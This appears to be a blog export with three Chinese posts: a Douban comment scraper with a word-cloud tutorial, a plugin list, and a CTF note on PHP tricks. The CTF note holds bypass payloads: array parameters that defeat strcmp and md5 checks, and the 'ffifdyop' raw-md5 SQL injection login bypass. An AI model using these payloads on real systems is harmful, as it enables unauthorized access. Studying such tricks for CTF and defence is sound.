<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解析页面</span></span><br><span class="line">tree = etree.HTML(get_data)</span><br><span class="line"><span class="comment"># 用户</span></span><br><span class="line">commentator = tree.xpath(<span class="string">&#x27;/html/body/div[3]/div[1]/div/div[1]/div[4]/div/div[2]/h3/span[2]/a/text()&#x27;</span>)</span><br><span class="line"><span class="comment"># 评论内容</span></span><br><span class="line">comment_content = tree.xpath(<span class="string">&#x27;/html/body/div[3]/div[1]/div/div[1]/div[4]/div/div[2]/p/span/text()&#x27;</span>)</span><br></pre></td></tr></table></figure>


<ol start="3">
<li><p>获得多页评论</p>
<p> 观察url地址 <code>page_url = &#39;https://movie.douban.com/subject/33404425/comments?start=20&amp;limit=20&amp;sort=new_score&amp;status=P&#39;</code>可以发现，下一页的地址start值是上一页值增加20的结果，其余都不发生变化。</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 页面url</span></span><br><span class="line">page_url = <span class="string">&#x27;https://movie.douban.com/subject/33404425/comments?start=&#123;0&#125;&amp;limit=20&amp;sort=new_score&amp;status=P&#x27;</span>.<span class="built_in">format</span>(i*<span class="number">20</span>)</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>将得到的数据表格化处理并保存</p>
<p> DataFrame是Python中Pandas库中的一种数据结构，它类似excel，是一种二维表。DataFrame的单元格可以存放数值、字符串等，这和excel表很像，同时DataFrame可以设置列名columns与行名index</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = [<span class="string">&#x27;用户&#x27;</span>, <span class="string">&#x27;评论内容&#x27;</span>]</span><br><span class="line">file = pd.DataFrame(columns=name, data=content)</span><br></pre></td></tr></table></figure>

<p><font color="yellow">点击获取</font> <a href="https://github.com/lemon-l/spider/blob/master/Douban%20comments/Hidden%20corner.py">代码</a></p>
<h1 id="生成词云"><a href="#生成词云" class="headerlink" title="生成词云"></a><font color="lighblue">生成词云</font></h1><ol>
<li><p>解析数据</p>
<p> 打开上面保存的文件，将评论内容保存在content里面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> codecs.<span class="built_in">open</span>(<span class="string">r&#x27;./comment_content.cvs&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">    content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    reader = csv.reader(csvfile)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> reader:</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">0</span> <span class="keyword">or</span> i == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            content = content + file[<span class="number">1</span>]</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="comment"># 去除所有评论里面多余的字符</span></span><br><span class="line">    content = re.sub(<span class="string">&#x27;[… “ ” ）：《 》？！（ 、,，。. \r\n]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, content)</span><br></pre></td></tr></table></figure></li>
<li><p>分析数据</p>
<p> 利用jieba库切词，去掉停用的词并统计词频，降序排列</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 切词，用jieba库</span></span><br><span class="line">segment = jieba.lcut(content)</span><br><span class="line"><span class="comment"># 去停用词（文本去噪）</span></span><br><span class="line">words_df = pd.DataFrame(&#123;<span class="string">&#x27;segment&#x27;</span>: segment&#125;)</span><br><span class="line">stopwords = pd.read_csv(<span class="string">r&quot;./豆瓣影评/stopwords.txt&quot;</span>, index_col=<span class="literal">False</span>,</span><br><span class="line">                       quoting=<span class="number">3</span>, sep=<span class="string">&quot;\t&quot;</span>, names=[<span class="string">&#x27;stopword&#x27;</span>], encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">words_df = words_df[~words_df.segment.isin(stopwords.stopword)]</span><br><span class="line"><span class="comment"># 统计词频、降序排列</span></span><br><span class="line">words_stat = words_df.groupby(<span class="string">&#x27;segment&#x27;</span>).agg(计数=pd.NamedAgg(</span><br><span class="line">   column=<span class="string">&#x27;segment&#x27;</span>, aggfunc=<span class="string">&#x27;size&#x27;</span>)).reset_index().sort_values(by=<span class="string">&#x27;计数&#x27;</span>, ascending=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>stopwords.txt 文件下载：<a href="http://www.datasoldier.net/archives/636">http://www.datasoldier.net/archives/636</a></p>
</li>
<li><p>数据可视化</p>
<p>生成词云，取词频最高的前1000个词</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 做词云</span></span><br><span class="line">bimg = imread(<span class="string">r&#x27;./豆瓣影评/hhh.jpg&#x27;</span>)</span><br><span class="line">matplotlib.rcParams[<span class="string">&#x27;figure.figsize&#x27;</span>] = (<span class="number">10.0</span>, <span class="number">6.0</span>)</span><br><span class="line"><span class="comment"># 设置中文字体 背景颜色等</span></span><br><span class="line">wordcloud = WordCloud(font_path=<span class="string">&#x27;C:/Windows/Fonts/simfang.ttf&#x27;</span>,</span><br><span class="line">                    mask=bimg, background_color=<span class="string">&#x27;white&#x27;</span>, max_font_size=<span class="number">80</span>)</span><br><span class="line"><span class="comment"># 字典推导式</span></span><br><span class="line">word_frequence = &#123;x[<span class="number">0</span>]: x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> words_stat.head(</span><br><span class="line">    <span class="number">1000</span>).values&#125;  <span class="comment"># 取词频最高的前1000个词 (词，词频)-&gt;&#123;词：词频&#125;</span></span><br><span class="line">wordcloud = wordcloud.fit_words(word_frequence)</span><br><span class="line">bimgColors = ImageColorGenerator(bimg)</span><br><span class="line">result = wordcloud.recolor(color_func=bimgColors)</span><br><span class="line">plt.axis(<span class="string">&quot;off&quot;</span>)</span><br><span class="line">plt.imshow(result)</span><br><span class="line">plt.show()</span><br><span class="line">result.to_file(<span class="string">r&#x27;./豆瓣影评/词云.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>词云展示</p>
<p> 背景图片是张朝阳哦！</p>
<div align="center"><img width="450" src="https://img-blog.csdnimg.cn/20200708002828987.jpg"></div></li>
</ol>
<p>参考链接：<a href="https://www.cnblogs.com/ctsch/p/8590551.html">https://www.cnblogs.com/ctsch/p/8590551.html</a></p>
<p><font color="yellow">点击获取</font> <a href="https://github.com/lemon-l/spider/blob/master/Douban%20comments/Data%20Analysis.py">代码</a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a><font color="lighblue">总结</font></h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过生成的词云不难看出剧中演员的塑造能力，剧情的逻辑性和节奏性，故事的细节处理和镜头的质感都是这部国产悬疑改编网剧能够吸引人眼球的原因。当然也期待未来能有更多的好剧出现在大众视野。再次表白我男神秦昊，演技顶呱呱！</p>
<hr>
<p>完整内容github获取：<a href="https://github.com/lemon-l/spider/tree/master/Douban%20comments">https://github.com/lemon-l/spider/tree/master/Douban%20comments</a></p>
]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>常用编译器、软件、网站的nb插件</title>
    <url>/2020/06/30/%E5%B8%B8%E7%94%A8%E7%BC%96%E8%AF%91%E5%99%A8%E3%80%81%E8%BD%AF%E4%BB%B6%E3%80%81%E7%BD%91%E7%AB%99%E7%9A%84nb%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="VSCode"><a href="#VSCode" class="headerlink" title="VSCode"></a>VSCode</h1><p>众所周知，vscode是一款游戏软件，音视频播放器，文件图片查看器，流程图绘制工具，你甚至可以用它来写代码。这里主要分享一些vscode实用的小插件和简单操作。</p>
<h2 id="必备"><a href="#必备" class="headerlink" title="必备"></a><font color="orange">必备</font></h2><ol>
<li><font color="green">Visual Studio Intellicode</font>：帮助开发人员提供智能的代码完成建议，预先构建了对多种编程语言的支持</li>
<li><font color="green">vscode-icons</font> ：设置文件图标主题</li>
<li><font color="green">Chinese (Simplified) Language Pack for Visual Studio Code</font>：适用于VS Code的中文（简体）语言包</li>
<li><font color="green">local history</font>：找回历史代码</li>
<li><font color="green">Partial Diff</font>：文件比较，查看修改代码的地方，超看输出的日志信息</li>
<li><font color="green">TODO Tree</font>：给不确定的代码做标记，相当于标签</li>
<li><font color="green">Better Comments</font>：让VS Code注释信息更加人性化</li>
<li><font color="green">Bracket Pair Colorizer</font>：括号匹配。多层括号嵌套时，给每一层次的括号显示不同的颜色</li>
<li><font color="green">Better Align</font>：Ctrl+Shift+p 输入 “Align”，实现代码上下对齐</li>
<li> <font color="green">change-case</font>：Ctrl+Shift+p 输入 “change”，实现快速修改当前选定内容（命名规则）</li>
<li><font color="green">Markdown All in One</font>：媲美 Typora 的 Markdown 编辑体验</li>
<li><font color="green">Prettier - Code formatter</font>：强大的、自以为是的代码格式化程序</li>
<li><font color="green">Debugger for Chrome</font>：直接在Visual Studio Code中调试JavaScript源文件</li>
</ol>
<h2 id="实用"><a href="#实用" class="headerlink" title="实用"></a><font color="orange">实用</font></h2><ol>
<li><a href="https://mp.weixin.qq.com/s/J8nAA0IFkwCff1vWzc-kVg">VSCode 画出完美的流程图、思维导图与 UML 图</a>，github地址：<a href="https://github.com/hediet/vscode-drawio">vscode-drawio</a></li>
<li><a href="https://github.com/jdneo/vscode-leetcode">vscode-leetcode</a>：在 VSCode 上刷 LeetCode</li>
</ol>
<h2 id="上班摸鱼"><a href="#上班摸鱼" class="headerlink" title="上班摸鱼"></a><font color="orange">上班摸鱼</font></h2><ol>
<li><a href="https://github.com/deepred5/daily-anime">daily-anime</a> ：为喜爱二次元、动漫的人量身定做，在 VSCode 上划水追番，第一时间知道番剧的更新。</li>
<li> <a href="https://github.com/my-soul/read-vscode-e">read-vscode-e</a>：边看小说边码代码，还不怕被老板发现。</li>
<li><a href="https://github.com/nondanee/vsc-netease-music">vsc-netease-music</a>：美妙的音乐配合上 VSCode 更显极客范。</li>
</ol>
<h1 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h1><ol>
<li><font color="green">Octotree</font>：展现当前项目的目录结构，快速浏览整个项目</li>
<li><font color="green">Sourcegraph</font>：可以作为web IDE使用，不用将项目代码clone到本地，就可以很方便的浏览代码</li>
<li><font color="green">Enhanced GitHub</font>：支持单个文件下载</li>
<li><font color="green">GitHub Dark Theme</font>：支持git混夜间模式，对于喜欢暗黑风格的我来说很nice<h1 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h1></li>
<li><a href="https://saladict.crimx.com/download.html">沙拉查词</a>：超好用的聚合词典划词翻译，推荐指数 — 100</li>
<li><font color="green">Adblock Plus</font>： 免费的广告终结器，妈妈再也不用担心我看到小黄窗口了！</li>
<li><font color="green">Proxy SwitchyOmega</font>：轻松快捷地管理和切换多个代理设置</li>
<li><font color="green">HTTP Header Live</font>：展示网页传送的头部信息</li>
</ol>
<h1 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h1><ol>
<li><font color="green">谷歌访问助手</font>：能直接访问外网，虽然速度有点慢</li>
<li><font color="green">Web Scraper</font>：简单的静态爬虫 。提取码：<a href="https://pan.baidu.com/s/1N8xRidMT7m7uq3RyDUJOYw">31ax</a>  </li>
<li><font color="green">XPath Helper</font>：获取xpath地址，检测自己写的xpath</li>
</ol>
<hr>
<p>会持续分享哦！！！</p>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>积累</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF与php千丝万缕的联系</title>
    <url>/2020/05/10/CTF%E4%B8%8Ephp%E5%8D%83%E4%B8%9D%E4%B8%87%E7%BC%95%E7%9A%84%E8%81%94%E7%B3%BB/</url>
    <content><![CDATA[<h1 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h1><h2 id="系统变量（超全局变量）"><a href="#系统变量（超全局变量）" class="headerlink" title="系统变量（超全局变量）"></a>系统变量（超全局变量）</h2><p>在全部作用域中始终可用的内置变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$GLOBALS</span> <span class="comment">// 引用全局作用域中可用的全部变量</span></span><br><span class="line"><span class="variable">$_POST</span> <span class="comment">// 获取 post 数据，是一个字典</span></span><br><span class="line"><span class="variable">$_GET</span> <span class="comment">// 获取 get 数据，是一个字典</span></span><br><span class="line"><span class="variable">$_COOKIE</span> <span class="comment">// 获取 cookie</span></span><br><span class="line"><span class="variable">$_SESSION</span> <span class="comment">// 获取 session</span></span><br><span class="line"><span class="variable">$_FILES</span> <span class="comment">// 获取上传的文件</span></span><br><span class="line"><span class="variable">$_REQUEST</span> <span class="comment">// 获取 $_GET，$_POST，$_COOKIE 中的数据</span></span><br><span class="line"><span class="variable">$_ENV</span> <span class="comment">// 环境变量</span></span><br><span class="line"><span class="variable">$_SERVER</span> <span class="comment">// 服务器和执行环境信息</span></span><br></pre></td></tr></table></figure>
<h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><p>可变变量是 php 独有的特性，可变变量指的是变量名可变，将一个普通变量的值作为可变变量的变量名，而变量（即普通变量）指的是变量值可变。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="comment">// 定义可变变量时，可以加上大括号</span></span><br><span class="line">$&#123;<span class="variable">$a</span>&#125;=<span class="string">&quot;world&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $&#123;<span class="variable">$a</span>&#125;;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$a</span>; <span class="comment">// 将普通变量的值 hello，作为可变变量的变量名，即 $a</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hello</span>;</span><br></pre></td></tr></table></figure>

<h2 id="错误控制运算符"><a href="#错误控制运算符" class="headerlink" title="错误控制运算符"></a>错误控制运算符</h2><p>PHP 支持一个错误控制运算符：@。当将其放置在一个PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>定义数组的方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;user&quot;</span> =&gt; <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pass&quot;</span>=&gt;<span class="string">&quot;P@ssw0rd&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>[<span class="string">&#x27;pass&#x27;</span>] = <span class="string">&#x27;P@ssw0rd&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="Quotation-Marks"><a href="#Quotation-Marks" class="headerlink" title="Quotation Marks"></a>Quotation Marks</h2><p>双引号解析变量，单引号不解析变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;str is <span class="subst">$str</span>&quot;</span>; <span class="comment">// 运行结果 : str is hello</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;str is $str&#x27;</span>; <span class="comment">// 运行结果 : str is $str</span></span><br></pre></td></tr></table></figure>
<h2 id="变量默认值"><a href="#变量默认值" class="headerlink" title="变量默认值"></a>变量默认值</h2><p>当定义一个变量，如果没有设置值，默认为0</p>
<h2 id="打印变量"><a href="#打印变量" class="headerlink" title="打印变量"></a>打印变量</h2><pre><code>print_r，显示关于一个变量的易于理解的信息。如果给出的是 string、integer 或 float，将打印变量值本身。如果给出的是 array，将会按照一定格式显示键和元素。object 与数组类似。
var_dump，返回变量的数据类型和值
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line">print_r(<span class="string">&#x27;aaa&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="文件操作相关"><a href="#文件操作相关" class="headerlink" title="文件操作相关"></a>文件操作相关</h2><p>列出目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">scandir(<span class="string">&#x27;/site&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>输出文件内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show_source(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">var_dump(file(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">print_r(file(<span class="string">&#x27;flag.php&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>读取文件内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="comment">#也可以读取远程 URL 的文件</span></span><br><span class="line">file_get_contents(<span class="string">&#x27;http://xxx.xxx.com/index.html&#x27;</span>);</span><br><span class="line"><span class="comment">#输入不合法的url会显示Error: Invalid URL，如果对php的报错熟悉会知道这可能是由 file_get_contents 函数触发的报错</span></span><br></pre></td></tr></table></figure>

<h1 id="2-GET-和-POST"><a href="#2-GET-和-POST" class="headerlink" title="2.  $_GET 和 $_POST"></a>2.  $_GET 和 $_POST</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//www.example.com/web/false.php?name[]=a&amp;password[]=b</span></span><br></pre></td></tr></table></figure>

<p>如果 GET 参数中设置 name[]=a，那么 $_GET[‘name’] = [a]，php 会把 []=a 当成数组传入， $_GET 会自动对参数调用 urldecode。</p>
<p>$_POST 同样存在此漏洞，提交的表单数据，user[]=admin，$_POST[‘user’] 得到的是 [‘admin’] 是一个数组。</p>
<h1 id="3-内置函数的松散性"><a href="#3-内置函数的松散性" class="headerlink" title="3. 内置函数的松散性"></a>3. 内置函数的松散性</h1><h2 id="strcmp-和-strcasecmp"><a href="#strcmp-和-strcasecmp" class="headerlink" title="strcmp 和 strcasecmp"></a>strcmp 和 strcasecmp</h2><p>strcmp 和 strcasecmp（不区分大小写） 用于比较字符串，返回值如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">如果 str1 小于 str2 返回 &lt; <span class="number">0</span>；</span><br><span class="line">如果 str1 大于 str2 返回 &gt; <span class="number">0</span>；</span><br><span class="line">如果两者相等，返回 <span class="number">0</span>。</span><br></pre></td></tr></table></figure>
<p>数组跟字符串比较会返回 0</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$array</span>=[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="comment">//这里会输出 null，在某种意义上 null 也就是相当于 false，也就是判断为相等</span></span><br><span class="line">var_dump(strcmp(<span class="variable">$array</span>, <span class="string">&#x27;abc&#x27;</span>)); </span><br><span class="line">var_dump(strcasecmp(<span class="variable">$array</span>, <span class="string">&#x27;abc&#x27;</span>));</span><br></pre></td></tr></table></figure>

<h2 id="sha1-和-md5-函数"><a href="#sha1-和-md5-函数" class="headerlink" title="sha1 和 md5 函数"></a>sha1 和 md5 函数</h2><p>语法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># raw为可选，规定十六进制或二进制输出格式</span></span><br><span class="line"><span class="comment"># TRUE - 原始 16 字节格式</span></span><br><span class="line"><span class="comment"># FALSE - 默认，32 字符十六进制数</span></span><br><span class="line">md5(<span class="keyword">string</span>, raw)</span><br></pre></td></tr></table></figure>

<p>md5 和 sha1 无法处理数组，但是 php 没有抛出异常，直接返回 fasle</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sha1([]) === <span class="literal">false</span></span><br><span class="line">md5([]) === <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>md5 和 sha1 支持第二个参数，如果为 true，则会将 hash 后的 16 进制字符串以 16 进制转成字符串的形式返回，如果在 SQL 语句中这样写，会存在注入的问题。</p>
<p>提供一个字符串：ffifdyop，md5后，276f722736c95d99e921722cf9ed621c<br>再转成字符串： ‘or’6</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可以实现绕过</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;ffifdyop&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE pass = &#x27;&quot;</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>

<h2 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url"></a>parse_url</h2><p>parse_url() 函数可以解析 URL，返回其组成部分，此函数并不意味着给定的 URL 是合法的，它只是将上方列表中的各部分分开。parse_url() 可接受不完整的 URL，并尽量将其解析正确。</p>
<p><font color='blue'>1. url解析错误</font></p>
<p>parse_url在url不能被解析的时候就会返回false。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">var_dump(parse_url(<span class="variable">$url</span>));</span><br></pre></td></tr></table></figure>

<p>当一个url没有协议的时候，但是给一个端口url的字符串的时候parse_url就会爆错。这个经测试在windows下应该是php版本全通杀的(5.2-7.0)，linux没测试过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/pupiles.com:<span class="number">80</span></span><br></pre></td></tr></table></figure>

<p>只要端口后面跟字母还是会解析，比如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/pupiles.com:<span class="number">80</span>a</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;path&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;/pupiles.com:80a&#x27;</span> (length=<span class="number">16</span>)</span><br></pre></td></tr></table></figure>
<p><font color='blue'>2. 端口解析错误</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// php5.5以上这样的url用parse_url解析后预测的结果是</span></span><br><span class="line"><span class="comment">//pupiles.com/about:1234</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;pupiles.com&quot;</span></span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;/about:1234&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然而实际结果是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;pupiles.com&quot;</span></span><br><span class="line">  [<span class="string">&quot;port&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1234</span>)</span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;/about:1234&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会默认解析出一个portkey</p>
<p><font color='blue'>3. 路径解析错误</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// single slash case</span></span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;/upload?/home/binarycloud/&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = parse_url(<span class="variable">$uri</span>);</span><br><span class="line">print_r(<span class="variable">$data</span>);</span><br><span class="line"><span class="comment">// doubleslash case</span></span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;//upload?/home/binarycloud/&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = parse_url(<span class="variable">$uri</span>);</span><br><span class="line">print_r(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [path] =&gt; /upload</span><br><span class="line">    [query] =&gt; /home/binarycloud/</span><br><span class="line">)</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [host] =&gt; upload?</span><br><span class="line">    [path] =&gt; /home/binarycloud/</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><font color='blue'>4. 端口溢出</font></p>
<p>在php5.3.13版本以下，当输入如下url</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//pupiles:78325</span></span><br></pre></td></tr></table></figure>

<p>按照正常来说应该会返回false，但是这里会返回</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123; </span><br><span class="line">    [<span class="string">&quot;scheme&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span> </span><br><span class="line">    [<span class="string">&quot;host&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;pupiles&quot;</span> </span><br><span class="line">    [<span class="string">&quot;port&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">12789</span>) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="4-弱类型"><a href="#4-弱类型" class="headerlink" title="4. 弱类型"></a>4. 弱类型</h1><ul>
<li>当一个整形和一个其他类型行比较的时候，会先把其他类型 intval 再比较</li>
<li> bool类型的 true 跟任意字符串可以弱类型相等</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> == <span class="string">&#x27;1abc&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="literal">true</span> == <span class="string">&#x27;abcd&#x27;</span>  <span class="comment">// true </span></span><br><span class="line"><span class="string">&quot;42&quot;</span> == <span class="string">&quot;42.0&quot;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;42&quot;</span> == <span class="string">&quot;000042.00&quot;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;42&quot;</span> == <span class="string">&quot;0x000000002A&quot;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;10&quot;</span> == <span class="string">&quot;1e1&quot;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;42&quot;</span> == <span class="string">&quot;0000000004.2E+1&quot;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;42&quot;</span> == <span class="string">&quot;42.0e+000000&quot;</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="literal">false</span>] == [<span class="number">0</span>] == [<span class="literal">NULL</span>] == [<span class="string">&#x27;&#x27;</span>]</span><br><span class="line"><span class="literal">NULL</span> == <span class="literal">false</span> == <span class="number">0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;0.999999999999999999999&#x27;</span> == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># true in PHP 4.3.0+</span></span><br><span class="line"><span class="string">&#x27;0e0&#x27;</span> == <span class="string">&#x27;0e1&#x27;</span></span><br><span class="line"><span class="string">&#x27;0e0&#x27;</span> == <span class="string">&#x27;0E1&#x27;</span></span><br><span class="line"><span class="string">&#x27;10e2&#x27;</span> == <span class="string">&#x27; 01e3&#x27;</span></span><br><span class="line"><span class="string">&#x27;10e2&#x27;</span> == <span class="string">&#x27;01e3&#x27;</span></span><br><span class="line"><span class="string">&#x27;10e2&#x27;</span> == <span class="string">&#x27;1e3&#x27;</span></span><br><span class="line"><span class="string">&#x27;010e2&#x27;</span> == <span class="string">&#x27;1e3&#x27;</span></span><br><span class="line"><span class="string">&#x27;010e2&#x27;</span> == <span class="string">&#x27;01e3&#x27;</span></span><br><span class="line"><span class="string">&#x27;10&#x27;</span> == <span class="string">&#x27;010&#x27;</span></span><br><span class="line"><span class="string">&#x27;10.0&#x27;</span> == <span class="string">&#x27;10&#x27;</span></span><br><span class="line"><span class="string">&#x27;10&#x27;</span> == <span class="string">&#x27;00000000010&#x27;</span></span><br><span class="line"><span class="string">&#x27;12345678&#x27;</span> == <span class="string">&#x27;00000000012345678&#x27;</span></span><br><span class="line"><span class="string">&#x27;0010e2&#x27;</span> == <span class="string">&#x27;1e3&#x27;</span></span><br><span class="line"><span class="string">&#x27;123000&#x27;</span> == <span class="string">&#x27;123e3&#x27;</span></span><br><span class="line"><span class="string">&#x27;123000e2&#x27;</span> == <span class="string">&#x27;123e5&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># true in 5.2.1+</span></span><br><span class="line"><span class="comment"># false in PHP 